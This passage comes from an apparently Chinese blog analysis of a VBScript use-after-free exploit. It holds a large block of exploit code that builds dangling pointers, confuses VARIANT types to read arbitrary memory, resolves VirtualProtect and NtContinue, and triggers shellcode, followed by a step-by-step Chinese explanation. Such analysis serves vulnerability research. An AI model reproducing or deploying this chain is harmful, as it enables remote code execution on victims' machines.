//&#x540E;&#x9762;&#x7684;&#x7A0B;&#x5E8F;&#x51FA;&#x73B0;&quot;&#x8FD0;&#x884C;&#x65F6;&#x9519;&#x8BEF;&quot;&#x65F6;&#xFF0C;&#x4F1A;&#x7EE7;&#x7EED;&#x8FD0;&#x884C;&#xFF0C;&#x4E0D;&#x4E2D;&#x65AD;&#x3002;</span><br><span class="line">    Dim a</span><br><span class="line">    a = EmptyFunc</span><br><span class="line">    a = null</span><br><span class="line">        // MsgBox &quot;set_need_longint a&quot;</span><br><span class="line">    //IsEmpty(a)</span><br><span class="line">    set_need_longint(a)</span><br><span class="line">    //MsgBox &quot;read_longint&quot;</span><br><span class="line">    //IsEmpty(a)</span><br><span class="line">    exp_c = read_longint()</span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line">Class class_ter_a</span><br><span class="line">    Private Sub Class_Terminate()</span><br><span class="line">        Set wild_ref_arr_a(idx) = ab(1)</span><br><span class="line">        idx = idx + 1</span><br><span class="line">        ab(1) = 1</span><br><span class="line">    End Sub</span><br><span class="line">End Class</span><br><span class="line"></span><br><span class="line">Class class_ter_b</span><br><span class="line">    Private Sub Class_Terminate()</span><br><span class="line">        Set wild_ref_arr_b(idx) = ab(1)</span><br><span class="line">        idx = idx + 1</span><br><span class="line">        ab(1) = 1</span><br><span class="line">    End Sub</span><br><span class="line">End Class</span><br><span class="line"></span><br><span class="line">Class empty_class</span><br><span class="line">End Class</span><br><span class="line"></span><br><span class="line">Class class_setprop_a</span><br><span class="line">    Dim mem</span><br><span class="line"></span><br><span class="line">    Function P</span><br><span class="line">    End Function</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    Function SetProp(Value)</span><br><span class="line">        mem = Value</span><br><span class="line">        SetProp = 0</span><br><span class="line">    End Function</span><br><span class="line">End Class</span><br><span class="line"></span><br><span class="line">Class class_fun_a</span><br><span class="line">    Dim mem</span><br><span class="line"></span><br><span class="line">    &apos; Note: the func name len is magic</span><br><span class="line">    Function Read_Memory</span><br><span class="line">        //MsgBox &quot;Read_Memory&quot;</span><br><span class="line">        //IsEmpty(Read_Memory)</span><br><span class="line">        Read_Memory = LenB(mem(rw_var + 8))</span><br><span class="line">        //IsEmpty(Read_Memory)</span><br><span class="line">        </span><br><span class="line">    End Function</span><br><span class="line"></span><br><span class="line">    Function SPP</span><br><span class="line">    End Function</span><br><span class="line">End Class</span><br><span class="line"></span><br><span class="line">Class class_getp_a  //&#x6DF7;&#x6DC6;&#x7C7B;1</span><br><span class="line">    Public Default Property Get P</span><br><span class="line">        Dim fun</span><br><span class="line">        &apos;0000200C 00000000</span><br><span class="line">        P = CDbl(&quot;174088534690791e-324&quot;)</span><br><span class="line"></span><br><span class="line">        For i=0 To 6</span><br><span class="line">            wild_ref_arr_a(i) = 0</span><br><span class="line">        Next</span><br><span class="line">        Set fun = New class_fun_a</span><br><span class="line">        fun.mem = fake_array</span><br><span class="line"></span><br><span class="line">        For i=0 To 6</span><br><span class="line">            Set wild_ref_arr_a(i) = fun</span><br><span class="line">        Next</span><br><span class="line"></span><br><span class="line">    End Property</span><br><span class="line">End Class</span><br><span class="line"></span><br><span class="line">Class class_getp_b  //&#x6DF7;&#x6DC6;&#x7C7B;2</span><br><span class="line">    Public Default Property Get P</span><br><span class="line">        Dim fun</span><br><span class="line">        &apos;00000003 00000000</span><br><span class="line">        P = CDbl(&quot;636598737289582e-328&quot;)</span><br><span class="line"></span><br><span class="line">        For i=0 To 6</span><br><span class="line">            wild_ref_arr_b(i) = 0</span><br><span class="line">        Next</span><br><span class="line"></span><br><span class="line">        Set fun = New class_fun_a</span><br><span class="line">        fun.mem = fake_str</span><br><span class="line"></span><br><span class="line">        For i=0 To 6</span><br><span class="line">            Set wild_ref_arr_b(i) = fun</span><br><span class="line">        Next</span><br><span class="line">    End Property</span><br><span class="line">End Class</span><br><span class="line"></span><br><span class="line">Set getp_a = New class_getp_a</span><br><span class="line">Set getp_b = New class_getp_b</span><br><span class="line"></span><br><span class="line">Sub exp_a</span><br><span class="line">    For i=0 To 17</span><br><span class="line">        Set aa(i) = New empty_class</span><br><span class="line">    Next</span><br><span class="line">    </span><br><span class="line">    For i=20 To 38</span><br><span class="line">        Set aa(i) = New class_setprop_a</span><br><span class="line">    Next</span><br><span class="line">    </span><br><span class="line">    idx = 0</span><br><span class="line">    For i=0 To 6</span><br><span class="line">        ReDim ab(1)</span><br><span class="line">        Set ab(1) = New class_ter_a</span><br><span class="line">        Erase ab</span><br><span class="line">    Next</span><br><span class="line">    </span><br><span class="line">    Set setprop_a_1 = New class_setprop_a</span><br><span class="line"></span><br><span class="line">    idx = 0</span><br><span class="line">    For i=0 To 6</span><br><span class="line">        ReDim ab(1)</span><br><span class="line">        Set ab(1) = New class_ter_b</span><br><span class="line">        Erase ab</span><br><span class="line">    Next</span><br><span class="line"></span><br><span class="line">    Set setprop_a_2 = New class_setprop_a</span><br><span class="line"></span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Sub exp_b</span><br><span class="line">    setprop_a_1.SetProp(getp_a)</span><br><span class="line">    setprop_a_2.SetProp(getp_b)</span><br><span class="line">     //&#x5B9E;&#x73B0;&#x4EFB;&#x610F;&#x5730;&#x5740;&#x8BFB;&#x53D6;</span><br><span class="line">    rw_var = setprop_a_2.mem</span><br><span class="line">    //IsEmpty(rw_var)</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Sub StartExploit</span><br><span class="line">    exp_a()</span><br><span class="line">    exp_b()</span><br><span class="line">       // MsgBox &quot;leakaddr&quot;</span><br><span class="line">    //IsEmpty(rw_var)</span><br><span class="line">    leakaddr = exp_c()</span><br><span class="line">        //IsEmpty(leakaddr) </span><br><span class="line">    vbscript_mod_base   = GetBaseAddrByPoiAddr(GetUint32(leakaddr))</span><br><span class="line">    MsgBox &quot;vbscript_mod_base&quot;</span><br><span class="line">    IsEmpty(vbscript_mod_base) </span><br><span class="line">    msvcrt_mod_base     = GetModuleFromImport(vbscript_mod_base, &quot;msvcrt.dll&quot;)</span><br><span class="line">    MsgBox &quot;msvcrt_mod_base&quot;</span><br><span class="line">    IsEmpty(msvcrt_mod_base) </span><br><span class="line">    kernelbase_mod_base = GetModuleFromImport(msvcrt_mod_base, &quot;kernelbase.dll&quot;)</span><br><span class="line">    MsgBox &quot;kernelbase_mod_base&quot;</span><br><span class="line">    IsEmpty(kernelbase_mod_base) </span><br><span class="line">    ntdll_mod_base      = GetModuleFromImport(msvcrt_mod_base, &quot;ntdll.dll&quot;)</span><br><span class="line">    MsgBox &quot;ntdll_mod_base&quot;</span><br><span class="line">    IsEmpty(ntdll_mod_base) </span><br><span class="line">    api_VirtualProtect  = GetProcAddress(kernelbase_mod_base, &quot;VirtualProtect&quot;)</span><br><span class="line">    MsgBox &quot;api_VirtualProtect&quot;</span><br><span class="line">    IsEmpty(api_VirtualProtect)</span><br><span class="line">    api_NtContinue      = GetProcAddress(ntdll_mod_base,&quot;NtContinue&quot;)</span><br><span class="line">    MsgBox &quot;api_NtContinue&quot;</span><br><span class="line">    IsEmpty(api_NtContinue)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    set_need_longint(shellcode())</span><br><span class="line">    sc = read_longint() + 8</span><br><span class="line">    set_need_longint(make_virtualprotect_bytes(sc))</span><br><span class="line">    v2 = read_longint() + &amp;h10FDC</span><br><span class="line">    set_need_longint(make_final_bytes(v2))</span><br><span class="line">    v3 = read_longint()</span><br><span class="line">    trigger_var_clear()</span><br><span class="line">    </span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">StartExploit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>&#x5148;&#x521B;&#x5EFA;18&#x4E2A;&#x7A7A;&#x7684;empty_class&#x5BF9;&#x8C61;&#xFF0C;&#x4FDD;&#x5B58;&#x5728;&#x6570;&#x7EC4;aa(0)-aa(17)&#xFF1B;&#x63A5;&#x7740;&#x521B;&#x5EFA;19&#x4E2A;class_setprop_a&#x7C7B;&#x5BF9;&#x8C61;&#xFF0C;&#x4FDD;&#x5B58;&#x5728;aa(20)-aa(38)&#xFF0C;&#x5373;&#x521D;&#x59CB;&#x5316;aa&#x6570;&#x7EC4;</p>
+<p>&#x5FAA;&#x73AF;7&#x6B21;&#xFF0C;ab&#x6570;&#x7EC4;&#x4FDD;&#x5B58;class_ter_a&#x7C7B;&#x5BF9;&#x8C61;&#xFF0C;&#x6E05;&#x9664;ab&#x6570;&#x7EC4;&#xFF0C;&#x5BFC;&#x81F4;&#x91CD;&#x8F7D;class_ter_a::Class_Terminate&#x51FD;&#x6570;&#xFF0C;&#x800C;&#x5728;&#x91CD;&#x8F7D;&#x51FD;&#x6570;&#x4E2D;&#xFF0C;&#x4F7F;&#x7528;wild_ref_arr_a&#x6570;&#x7EC4;&#x4FDD;&#x5B58;ab&#xFF08;1&#xFF09;&#xFF0C;&#x5373;class_ter_a&#x7C7B;&#x5BF9;&#x8C61;&#x3002;&#x5FAA;&#x73AF;&#x7ED3;&#x675F;&#xFF0C;&#x5373;&#x6784;&#x9020;&#x4E86;7&#x4E2A;wild_ref_arr_a&#x60AC;&#x6302;&#x6307;&#x9488;&#x3002;</p>
+<p>setprop_a_1 = New class_setprop_a&#xFF0C;&#x5B9A;&#x4E49;&#x5BF9;&#x8C61;setprop_a_1 &#x5360;&#x4F4D;&#x4E4B;&#x524D;&#x91CA;&#x653E;&#x7684;&#x5BF9;&#x8C61;&#x7A7A;&#x95F4;&#xFF0C;&#x6B64;&#x65F6;setprop_a_1 &#x548C; wild_ref_arr_a(6)&#x4E2D;&#x5404;&#x5143;&#x7D20;&#x5747;&#x6307;&#x5411;&#x540C;&#x4E00;&#x5757;&#x5185;&#x5B58;&#x7A7A;&#x95F4;&#xFF08;setprop_a_1 &#x5BF9;&#x8C61;&#xFF09;&#x3002;</p>
+<p>&#x518D;&#x5FAA;&#x73AF;7&#x6B21;&#xFF0C;ab&#x6570;&#x7EC4;&#x4FDD;&#x5B58;class_ter_b&#x7C7B;&#x5BF9;&#x8C61;&#xFF0C;&#x6E05;&#x9664;a&#x6570;&#x7EC4;&#xFF0C;&#x5BFC;&#x81F4;&#x91CD;&#x8F7D;class_ter_b::Class_Terminate&#x51FD;&#x6570;&#xFF0C;&#x800C;&#x5728;&#x8FD9;&#x4E2A;&#x91CD;&#x8F7D;&#x51FD;&#x6570;&#x4E2D;&#xFF0C;&#x4F7F;&#x7528;wild_ref_arr_b&#x6570;&#x7EC4;&#x4FDD;&#x5B58;ab&#xFF08;1&#xFF09;&#xFF0C;&#x5373;class_ter_b&#x7C7B;&#x5BF9;&#x8C61;&#x3002;&#x5FAA;&#x73AF;&#x7ED3;&#x675F;&#xFF0C;&#x5373;&#x540C;&#x6837;&#x53C8;&#x6784;&#x9020;&#x4E86;7&#x4E2A;wild_ref_arr_b&#x60AC;&#x6302;&#x6307;&#x9488;&#x3002;</p>
+<p>Set setprop_a_2 = New class_setprop_a,&#x5B9A;&#x4E49;&#x5BF9;&#x8C61;setprop_a_2 &#x5360;&#x4F4D;&#x4E4B;&#x524D;&#x91CA;&#x653E;&#x7684;&#x5BF9;&#x8C61;&#x7A7A;&#x95F4;&#xFF0C;&#x6B64;&#x65F6;setprop_a_2 &#x548C;winld_ref_arr_b(6)&#x4E2D;&#x4E2A;&#x5143;&#x7D20;&#x5747;&#x6307;&#x5411;&#x540C;&#x4E00;&#x5185;&#x5B58;&#x7A7A;&#x95F4;&#xFF08;setprop_a_2 &#x5BF9;&#x8C61;&#xFF09;&#x3002;</p>
+<p><img src="/2019/08/12/20190812-1/6.png" alt="img"></p>
+<p>setprop_a_1&#x5BF9;&#x8C61; &#x6709;&#x4E2A;SetProp&#x65B9;&#x6CD5;&#xFF0C;&#x5C06;class_setprop_a&#x7C7B;&#x4E2D;&#x7684;mem&#x6210;&#x5458;&#x8D4B;&#x503C;&#x4E3A;class_getp_a&#x7C7B;&#x5BF9;&#x8C61;getp_a&#xFF0C;&#x800C;getp_a&#x5BF9;&#x8C61;&#x9ED8;&#x8BA4;&#x521D;&#x59CB;&#x5316;&#x65F6;&#xFF0C;&#x8FDB;&#x5165;&#x5C5E;&#x6027;p&#xFF0C;&#x5176;&#x4E2D;&#x518D;&#x6B21;&#x6E05;&#x7A7A;7&#x4E2A;wild_ref_arr_a&#x60AC;&#x6302;&#x6307;&#x9488;,&#x7136;&#x540E;&#x6784;&#x9020;7&#x4E2A;fun&#x8D4B;&#x503C;&#x7ED9;7&#x4E2A;wild_ref_arr_a&#x60AC;&#x6302;&#x6307;&#x9488;,class_setprop_a&#x548C;class_fun_a&#x7C7B;&#x5177;&#x6709;&#x76F8;&#x540C;&#x504F;&#x79FB;&#x91CF;&#x7684;mem&#x6210;&#x5458;&#x3002;&#x8FD9;&#x91CC;class_fun_a&#x7C7B;&#x7684;mem&#x6210;&#x5458;&#x662F;&#x9884;&#x5148;&#x5B9A;&#x4E49;&#x597D;&#x7684;fake_array&#x6570;&#x7EC4;&#x3002;&#x4E00;&#x4E2A;&#x7279;&#x5B9A;&#x7684;&#x6D6E;&#x70B9;&#x6570;174088534690791e-324&#x5373;&#x201C;00000005 000005dd 00000000 0000200c&#x201D;&#xFF0C;&#x8BE5;&#x6570;&#x636E;&#x5C06;&#x8FD4;&#x56DE;&#x7ED9;&#x8C03;&#x7528;&#x8005;class_setprop_a&#x5BF9;&#x8C61;&#x7684;mem&#x6210;&#x5458;</p>
+<p>&#x540C;&#x6837;&#x7684;&#xFF0C;</p>
+<p>setprop_a_2&#x5BF9;&#x8C61; &#x4E5F;&#x6709;SetProp&#x65B9;&#x6CD5;&#xFF0C;&#x5C06;class_setprop_a&#x7C7B;&#x4E2D;&#x7684;mem&#x6210;&#x5458;&#x8D4B;&#x503C;&#x4E3A;class_getp_b&#x7C7B;&#x5BF9;&#x8C61;getp_b&#xFF0C;&#x800C;getp_b&#x5BF9;&#x8C61;&#x9ED8;&#x8BA4;&#x521D;&#x59CB;&#x5316;&#x65F6;&#xFF0C;&#x8FDB;&#x5165;&#x5C5E;&#x6027;p&#xFF0C;&#x5176;&#x4E2D;&#x518D;&#x6B21;&#x6E05;&#x7A7A;7&#x4E2A;wild_ref_arr_b&#x60AC;&#x6302;&#x6307;&#x9488;,&#x7136;&#x540E;&#x6784;&#x9020;7&#x4E2A;fun&#x8D4B;&#x503C;&#x7ED9;7&#x4E2A;wild_ref_arr_a&#x60AC;&#x6302;&#x6307;&#x9488;&#x3002;&#x8FD9;&#x91CC;class_fun_a&#x7C7B;&#x7684;mem&#x6210;&#x5458;&#x662F;&#x9884;&#x5148;&#x5B9A;&#x4E49;&#x597D;&#x7684;fake_str&#x6570;&#x7EC4;&#x3002;&#x4E00;&#x4E2A;&#x7279;&#x5B9A;&#x7684;&#x6D6E;&#x70B9;&#x6570;636598737289582e-328&#xFF0C;&#x8BE5;&#x6570;&#x636E;&#x5C06;&#x8FD4;&#x56DE;&#x7ED9;&#x8C03;&#x7528;&#x8005;class_setprop_a&#x5BF9;&#x8C61;&#x7684;mem&#x6210;&#x5458;</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fake_array = Unescape(&quot;%u0001%u0880%u0001%u0000%u0000%u0000%u0000%u0000%uffff%u7fff%u0000%u0000&quot;)</span><br><span class="line">fake_str   = Unescape(&quot;%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000&quot;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/08/12/20190812-1/7.png" alt="img"></p>
+<p>&#x7531;&#x4E8E;7&#x4E2A;wild_ref_arr_a&#x60AC;&#x6302;&#x6307;&#x9488;&#x540E;&#x6709;1&#x4E2A;class_setprop_a,7&#x4E2A;wild_ref_arr_a&#x60AC;&#x6302;&#x6307;&#x9488;&#x662F;7&#x4E2A;class_fun_a&#xFF0C;&#x90A3;&#x4E48;&#x6700;&#x540E;P&#x5C5E;&#x6027;&#x7684;&#x8FD4;&#x56DE;&#x503C;&#x5FC5;&#x5B9A;&#x5728;class_setprop_a&#x548C;class_fun_a&#x7684;&#x9519;&#x4F4D;&#x5904;&#x6DF7;&#x80B4;&#xFF0C;&#x53EF;&#x4EE5;&#x8BC1;&#x660E;class_setprop_a&#x6307;&#x9488;&#x4E0E;class_fun_a&#x91CD;&#x53E0;&#x5373;&#x6307;&#x9488;&#x5730;&#x5740;&#x76F8;&#x540C;,&#x5229;&#x7528;P&#x7684;&#x503C;&#x7CBE;&#x5FC3;&#x6784;&#x9020;&#x5185;&#x5B58;&#x7ED3;&#x6784;&#x5C06;class_fun_a&#x7C7B;mem&#x7C7B;&#x578B;&#x4ECE;BSTR&#x6DF7;&#x80B4;&#x6210;Array&#x7C7B;&#x578B;,&#x4ECE;&#x800C;&#x5B9E;&#x73B0;&#x4EFB;&#x610F;&#x5185;&#x5B58;&#x8BFB;&#x53D6;&#x3002;</p>
+<p>&#x540C;&#x6837;&#x7684;&#xFF0C;7&#x4E2A;wild_ref_arr_b&#x60AC;&#x6302;&#x6307;&#x9488;&#x540E;&#x6709;1&#x4E2A;class_setprop_a,7&#x4E2A;wild_ref_arr_b&#x60AC;&#x6302;&#x6307;&#x9488;&#x662F;7&#x4E2A;class_fun_a&#xFF0C;&#x90A3;&#x4E48;&#x6700;&#x540E;P&#x5C5E;&#x6027;&#x7684;&#x8FD4;&#x56DE;&#x503C;&#x5FC5;&#x5B9A;&#x5728;class_setprop_a&#x548C;class_fun_a&#x7684;&#x9519;&#x4F4D;&#x5904;&#x6DF7;&#x80B4;,&#x53EF;&#x4EE5;&#x8BC1;&#x660E;&#xFF0C;class_setprop_a&#x6307;&#x9488;&#x4E0E;class_fun_a&#x91CD;&#x53E0;&#x5373;&#x6307;&#x9488;&#x5730;&#x5740;&#x76F8;&#x540C;,&#x5229;&#x7528;P&#x7684;&#x503C;&#x7CBE;&#x5FC3;&#x6784;&#x9020;&#x5185;&#x5B58;&#x7ED3;&#x6784;&#x5C06;class_fun_a&#x7C7B;mem&#x7C7B;&#x578B;&#x4ECE;BSTR&#x6DF7;&#x80B4;&#x6210;Array&#x7C7B;&#x578B;,&#x4ECE;&#x800C;&#x5B9E;&#x73B0;&#x4EFB;&#x610F;&#x5185;&#x5B58;&#x8BFB;&#x53D6;&#x3002;</p>
+<p>&#x5F53;&#x5B9E;&#x73B0;&#x6DF7;&#x80B4;&#x540E;,&#x53EF;&#x4EE5;&#x901A;&#x8FC7;class_setprop_a-&gt;mem&#x4E5F;&#x5C31;&#x662F;class_fun_a-&gt;mem&#x4E4B;&#x6CC4;&#x9732;&#x7684;&#x5730;&#x5740;mem,&#x56E0;&#x4E3A;&#x5BF9;&#x4E8E;VARIANT&#x7C7B;&#x578B;&#x7C7B;&#x578B;&#x5BF9;&#x4E8E;&#x7684;SAFEARRAY&#x7ED3;&#x6784;&#x9996;&#x90E8;&#x6709;2&#x4E2A;USHORT,&#x52A0;&#x8D77;&#x6765;&#x957F;&#x5EA6;&#x662F;4,&#x7136;&#x540E;&#x5C06;mem&#x8D4B;&#x503C;&#x6210;8&#x5373;string&#x7C7B;&#x578B;,&#x8FD9;&#x4E2A;string&#x7C7B;&#x578B;&#x957F;&#x5EA6;-&gt;cbElements&#x7684;&#x6307;&#x9488;&#x5730;&#x5740;&#x8D4B;&#x503C;&#x4E3A;addr+4,&#x8FD9;&#x6837;&#x518D;&#x901A;&#x8FC7;GetAddrValue&#x83B7;&#x53D6;&#x8FD9;&#x4E2A;string&#x7684;&#x957F;&#x5EA6;&#x5C31;&#x7B49;&#x4E8E;&#x8BFB;&#x53D6;addr&#x7684;&#x6307;&#x9488;&#x6307;&#x5411;&#x7684;&#x503C;&#xFF0C;&#x4ECE;&#x800C;&#x5B9E;&#x73B0;&#x4EFB;&#x610F;&#x5730;&#x5740;&#x8BFB;&#x53D6;,&#x6700;&#x540E;&#x83B7;&#x53D6;vbsscript.dll&#x7B49;&#x4E00;&#x7CFB;&#x5217;dll&#x5BFC;&#x51FA;&#x51FD;&#x6570;&#x7684;&#x57FA;&#x5740;&#x540E;,&#x901A;&#x8FC7;&#x6E05;&#x7A7A;wild_ref_arr_a&#x60AC;&#x6302;&#x6307;&#x9488;&#x6307;&#x9488;&#x65F6;&#x89E6;&#x53D1;vbscript!VAR::Clear&#x5BFC;&#x81F4;shellcode&#x6267;&#x884C;</p>
+<p><strong>//&#x6CE8;&#x610F;&#x8C03;&#x8BD5;&#x4E4B;&#x524D;&#x9700;&#x8981;&#x5173;&#x95ED;Page Heap&#x9009;&#x9879;</strong></p>
+<h5 id="&#x8C03;&#x8BD5;&#x7ED3;&#x679C;"><a href="#&#x8C03;&#x8BD5;&#x7ED3;&#x679C;" class="headerlink" title="&#x8C03;&#x8BD5;&#x7ED3;&#x679C;"></a>&#x8C03;&#x8BD5;&#x7ED3;&#x679C;</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span 